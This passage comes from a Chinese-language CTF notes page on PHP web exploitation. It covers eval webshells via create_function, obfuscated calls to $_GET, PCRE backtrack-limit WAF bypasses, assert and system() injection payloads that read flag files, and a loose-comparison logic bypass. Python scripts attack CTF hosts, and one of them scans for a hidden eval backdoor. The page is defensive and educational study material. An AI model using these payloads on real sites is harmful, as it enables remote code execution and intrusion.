class="hljs-variable">$newfunc</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#125;eval($_POST[&quot;cmd&quot;]);//&#x27;</span>);<br><span class="hljs-comment">// 等同于</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">newfunc</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="17-通过构造动态调用函数"><a href="#17-通过构造动态调用函数" class="headerlink" title="(17) 通过构造动态调用函数"></a>(17) 通过构造动态调用函数</h2><ul><li>例子：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span> = <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>));(<span class="hljs-variable">$$pi</span>)&#123;pi&#125;((<span class="hljs-variable">$$pi</span>)&#123;abs&#125;)<br></code></pre></td></tr></table></figure></li><li>分析：<ul><li><code>$pi = hex2bin(&quot;5f474554&quot;) =&gt; _GET</code></li><li>$$pi 取出真正的 <code>_GET</code> 数组，$p 得到的 <code>_GET</code> 只是字符串；因为 <code>[]</code> 被禁了就用 <code>&#123;&#125;</code> 代替，最后的得：</li><li><code>(_GET)&#123;pi&#125;((_GET)&#123;abs&#125;)</code></li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>) &amp;&amp; <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>) &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>) === <span class="hljs-string">&quot;I have a dream&quot;</span>) &#123;<br></code></pre></td></tr></table></figure><h2 id="18-使用-file-get-contents-file"><a href="#18-使用-file-get-contents-file" class="headerlink" title="(18) 使用  file_get_contents($file)"></a>(18) 使用  file_get_contents($file)</h2><ul><li>用 &#96;file_get</li></ul><p>_contents(‘php:&#x2F;&#x2F;input’)<code>来读取原始</code>POST<code>数据，而不是</code>$_POST&#96; 键值对。</p><p>  例如，如果你发送的是 <code>debu=aqua_is_cute&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2</code>，则 <code>php://input</code> 会读取整个 <code>debu=aqua_is_cute&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2</code> 作为字符串。</p><h2 id="19-pcre-回溯"><a href="#19-pcre-回溯" class="headerlink" title="(19) pcre 回溯"></a>(19) <code>pcre</code> 回溯</h2><ul><li>假设要匹配的正则是 <code>&lt;\?.\*[(</code>;?&gt;].*<code>，输入是 </code>&lt;?php phpinfo();&#x2F;&#x2F;aaaaa&#96;。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;Br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li>正则的 <code>&lt;</code> 匹配了输入的 <code>&lt;</code>。当前匹配成功则读取下一个字符。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li><code>?</code> 也匹配成功，继续。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li><code>.*</code> 会匹配完接下来的所有字符，目前是没什么问题，但是读取下一个正则时就出问题了。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li>发现输入已经没东西匹配了。此时 NFA 开始回溯，回退之前匹配的字符。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaa</span><br></code></pre></td></tr></table></figure><ul><li>回退出来的字符 <code>a</code> 仍然无法匹配 <code>[(</code>;?&gt;]&#96;。继续回溯。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaa</span><br></code></pre></td></tr></table></figure><ul><li>回溯这一步骤会重复执行，直到回溯到下面的状态。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<br></code></pre></td></tr></table></figure><ul><li>这一步回溯回退出来的字符是 <code>;</code>，匹配正则表达式 <code>[(</code>;?&gt;]&#96;。便停止回溯，匹配上字符。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure><ul><li>最后的一个正则表达式匹配完接下来的所有内容。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li>完全匹配成功，返回 <code>true</code>。如果我们数一下，会发现回溯次数为 <code>8</code>，而回溯次数是有上限的，默认是 <code>100</code> 万。如果输入字符串执行正则时回溯次数超过了这个上限，就会返回 <code>false</code>。但这个 <code>false</code> 可以被强制转换。</li></ul><p>例如下面的 WAF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id = 1 UNION &quot;</span> . <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;/*!A*/ &quot;</span>, <span class="hljs-number">10000</span>) . <span class="hljs-string">&quot;SELECT name, email FROM users;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQL Injection&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No SQL Injection detected.&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>可以利用 <code>pcre</code> 的回溯次数限制绕过。</li></ul><p>但是下面的 WAF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);  <br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$input</span>) === <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// fwrite($f, $input); ...</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>使用了 <code>===</code> 强等于，<code>PREG_BACKTRACK_LIMIT_ERROR</code> 不等于 <code>0</code>。利用这一特点，我们可以在 <code>payload</code> 末尾加一堆 <code>a</code>，使其超过回溯限制。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br>res = requests.post(<span class="hljs-string">&quot;http://4610db05-7adf-404b-8c30-b1047f5c5703.node4.buuoj.cn:81/&quot;</span>, data=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:payload&#125;)<br><span class="hljs-comment">#print(payload)</span><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="20-json-decode-json-true-cmd"><a href="#20-json-decode-json-true-cmd" class="headerlink" title="(20) json_decode($json, true)[&#39;cmd&#39;];"></a>(20) <code>json_decode($json, true)[&#39;cmd&#39;];</code></h2><ul><li><code>json_decode()</code> 是一个用于将 JSON 格式的字符串转换为 PHP 数据结构（数组或对象）的函数。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$json</span> = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;: &quot;echo hello&quot;, &quot;user&quot;: &quot;admin&quot;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><ul><li><p><code>json_decode($json, true)</code> 将 JSON 字符串解析为 PHP 关联数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$array</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-comment">// $array 现在等于：[&quot;cmd&quot; =&gt; &quot;echo hello&quot;, &quot;user&quot; =&gt; &quot;admin&quot;]</span><br><span class="hljs-variable">$command</span> = <span class="hljs-variable">$array</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-comment">// $command 现在等于 &quot;echo hello&quot;</span><br></code></pre></td></tr></table></figure></li><li><p><code>json_decode($json, false)</code> 将 JSON 字符串解析为一个 PHP 对象：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$object</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-comment">// $object 现在是一个对象，其属性如下：</span><br><span class="hljs-comment">// $object-&gt;cmd = &quot;echo hello&quot;</span><br><span class="hljs-comment">// $object-&gt;user = &quot;admin&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="21-assert-注入"><a href="#21-assert-注入" class="headerlink" title="(21) assert 注入"></a>(21) <code>assert</code> 注入</h2><ul><li><code>assert(&quot;intval($_GET[num])==1919810&quot;)</code></li><li><code>assert</code> 里面直接把我们的输入拼接进去了 <code>?num=114514)==114514;//</code></li></ul><h2 id="22-strstr"><a href="#22-strstr" class="headerlink" title="(22) strstr()"></a>(22) <code>strstr()</code></h2><ul><li><p>搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 <code>FALSE</code>。</p></li><li><p>语法：<code>strstr(string, search, before_search)</code></p></li><li><p><code>string</code>: 必需。规定被搜索的字符串。</p></li><li><p><code>search</code>: 必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</p></li><li><p><code>before_search</code>: 可选。一个默认值为 <code>false</code> 的布尔值。如果设置为 <code>true</code>，它将返回 <code>search</code> 参数第一次出现之前的字符串部分。</p></li><li><p>注意这个函数是大小写敏感的。这里可以用 <code>PHP://</code> 绕过，也可以考虑另外一个 PHP 伪协议：<code>data://</code></p></li></ul><h2 id="23-mb-substr"><a href="#23-mb-substr" class="headerlink" title="(23) mb_substr()"></a>(23) <code>mb_substr()</code></h2><ul><li><p>返回字符串的一部分，中文字符也可以使用。<code>substr()</code> 只针对英文字符</p></li><li><p>语法：<code>mb_substr(字符串, 起始, 长度, 编码)</code>，其中长度和编码可选。</p></li><li><p>将土耳其语中的 “İstanbul” 转换为小写时，可能输出带点的 “i”（”i̇stanbul”）</p></li></ul><h2 id="24-mb-strpos"><a href="#24-mb-strpos" class="headerlink" title="(24) mb_strpos()"></a>(24) <code>mb_strpos()</code></h2><ul><li><p>返回要查找的字符串在别一个字符串中首次出现的位置</p></li><li><p>语法：<code>mb_strpos (字符串, 要搜索的字符串)</code></p></li><li><p>因为 <code>mb_strpos()</code> 只会返回首次出现的位置，所以如果我们传类似于 <code>hint.php?想要查看的文件路径</code> 这样的 <code>payload</code> 的话，切割的结果是 <code>hint.php</code>，通过了过滤。问题是过滤通过了后这个 <code>payload</code> 根本就不是一个有效的文件名。</p></li><li><p>不急，<code>include</code> 有一个很有趣的特性：</p><ul><li>如果参数中包含 <code>../</code> 这样的路径，解析器则会忽略 <code>../</code> 之前的字符串而去在当前目录的父目录下寻找文件。</li><li>这意味着我们只要在想要查看的文件路径中使用 <code>../</code> 这类路径，<code>include</code> 就会自动忽略前面的内容，这样真正包含的文件名就是有效的了。一点一点试就可以得到正确的路径了。</li></ul></li></ul><h2 id="24-文件存在"><a href="#24-文件存在" class="headerlink" title="(24) 文件存在"></a>(24) 文件存在</h2><ul><li><p><code>file_exists()</code> 返回布尔值：</p><ul><li>如果文件存在，则返回 <code>TRUE</code></li><li>如果文件不存在，则返回 <code>FALSE</code></li></ul><p>与其他相关函数不同的是：</p><ul><li><code>is_file($filename)</code> 仅检查文件是否存在，并且必须是一个文件，而不是目录。</li><li><code>is_dir($filename)</code> 检查是否存在一个目录，哪怕它是空的。</li></ul></li></ul><h2 id="25-strpos"><a href="#25-strpos" class="headerlink" title="(25) strpos"></a>(25) <code>strpos</code></h2><ul><li>查找字符串在另一字符串中第一次出现的位置（区分大小写），如果没有找到字符串则返回 <code>FALSE</code>。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">templates/<span class="hljs-string">&#x27;.system(&#x27;</span>cat+./templates/flag.php<span class="hljs-string">&#x27;).&#x27;</span>.php<br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;templates/&#x27;.system(&#x27;cat+./templates/flag.php&#x27;).&#x27;.php&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br></code></pre></td></tr></table></figure><hr><h2 id="逻辑漏洞绕过"><a href="#逻辑漏洞绕过" class="headerlink" title="逻辑漏洞绕过"></a>逻辑漏洞绕过</h2><ul><li>源码如下：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$v1</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$v2</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$v3</span>=<span class="hljs-number">0</span>;<br><span class="hljs-variable">$a</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-title function_ invoke__">json_decode</span>(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;foo&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$a</span>))&#123;<br>   <span class="hljs-title function_ invoke__">is_numeric</span>(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>])?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>   <span class="hljs-keyword">if</span>(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>])&#123;<br>       (<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>]&gt;<span class="hljs-number">2021</span>)?<span class="hljs-variable">$v1</span>=<span class="hljs-number">1</span>:<span class="hljs-literal">NULL</span>;<br>   &#125;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>]))&#123;<br>       <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>])!==<br><br><span class="hljs-number">5</span> OR !<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>][<span class="hljs-number">0</span>])) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>       <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;me7e&quot;</span>, <span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;a2&quot;</span>]);<br>       <span class="hljs-variable">$pos</span>===<span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>       <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>           <span class="hljs-variable">$val</span>===<span class="hljs-string">&quot;me7e&quot;</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>       &#125;<br>       <span class="hljs-variable">$v2</span>=<span class="hljs-number">1</span>;<br>   &#125;<br>&#125;<br><span class="hljs-variable">$c</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>];<br><span class="hljs-variable">$d</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dog&#x27;</span>];<br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>])&#123;<br>   <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$d</span>) &amp;&amp; <span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>]!==<span class="hljs-variable">$d</span>)&#123;<br>       <span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;3|1|c&quot;</span>,<span class="hljs-variable">$d</span>.<span class="hljs-variable">$c</span>[<span class="hljs-number">0</span>])?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>       <span class="hljs-title function_ invoke__">strpos</span>((<span class="hljs-variable">$c</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$d</span>), <span class="hljs-string">&quot;me7e2021&quot;</span>)?<span class="hljs-variable">$v3</span>=<span class="hljs-number">1</span>:<span class="hljs-literal">NULL</span>;<br>   &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v1</span> &amp;&amp; <span class="hljs-variable">$v2</span> &amp;&amp; <span class="hljs-variable">$v3</span>)<br>&#123;<br>   <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag13</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p><strong>第一层</strong>： 需要传入一个不是数字但是大于 2021 的参数，根据弱比较可以让 <code>bar1=2022asd</code></p></li><li><p><strong>第二层</strong>: <code>bar2</code> 有 5 个元素，并且第一个是数组，让 <code>bar2=[[0],2,3,4,5]</code>，通过弱比较绕过 <code>array_search</code> 的搜索 </p></li><li><p><strong>第三层</strong>：因为是 PHP5，且 <code>eregi</code> 存在 <code>00</code> 截断可以直接绕过</p></li><li><p>所以可以构造如下 URL：<br><code>?foo=&#123;&quot;bar1&quot;:&quot;2022asd&quot;,&quot;bar2&quot;:[[0],2,3,4,5],&quot;a2&quot;:&quot;me7eorite&quot;&#125;&amp;cat[1][]=&quot;1&quot;&amp;dog=what&amp;cat[0]=%00me7e2021</code></p></li></ul><hr><h2 id="代码混淆-强网杯-2019-高明的黑客"><a href="#代码混淆-强网杯-2019-高明的黑客" class="headerlink" title="代码混淆 (强网杯 2019 - 高明的黑客)"></a>代码混淆 (强网杯 2019 - 高明的黑客)</h2><ul><li><p>首页提示了源码泄露，下载下来后发现有 3000 多个文件，而且文件中有 <code>eval</code> 还有 <code>assert</code>，但是有些没有执行命令的功能，似乎是被混淆了。</p></li><li><p>通过编写一个脚本遍历这些 <code>eval</code> 和 <code>assert</code> 方法找到一个能够执行命令的功能。exp 如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))<br><br>s1 = threading.Semaphore(<span class="hljs-number">100</span>)                                           <br>filePath = <span class="hljs-string">r&quot;H:\Programmar\phpstudy_pro\WWW\src&quot;</span><br>os.chdir(filePath)                                                    <br>requests.adapters.DEFAULT_RETRIES = <span class="hljs-number">5</span>                             <br>files = os.listdir(filePath)<br>session = requests.Session()<br>session.keep_alive = <span class="hljs-literal">False</span>                                           <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_content</span>(<span class="hljs-params">file</span>):<br>    s1.acquire()                                                <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;trying   &#x27;</span>+file+ <span class="hljs-string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:                            <br>        gets = <span class="hljs-built_in">list</span>(re.findall(<span class="hljs-string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))<br>        posts = <span class="hljs-built_in">list</span>(re.findall(<span class="hljs-string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))<br>    data = &#123;&#125;                                                     <br>    params = &#123;&#125;                                                       <br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> gets:<br>        params[m] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> posts:<br>        data[n] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br>    url = <span class="hljs-string">&#x27;http://101.43.122.252:8004/&#x27;</span>+file<br>    req = session.post(url, data=data, params=params)          <br>    req.close()                                                <br>    req.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>    content = req.text<br>    <span class="hljs-comment">#print(content)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:                                    <br>        flag = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> gets:<br>            req = session.get(url+<span class="hljs-string">&#x27;?%s=&#x27;</span>%a+<span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)<br>            content = req.text<br>            req.close()                                              <br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:<br>                flag = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> posts:<br>                req = session.post(url, data=&#123;b:<span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)<br>                content = req.text<br>                req.close()                                               <br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:                                                   <br>            param = a<br>        <span class="hljs-keyword">else</span>:<br>            param = b<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;file: &#x27;</span>+file+<span class="hljs-string">&quot;  and param:%s&quot;</span> %param)<br>        <span class="hljs-built_in">print</span>(<span 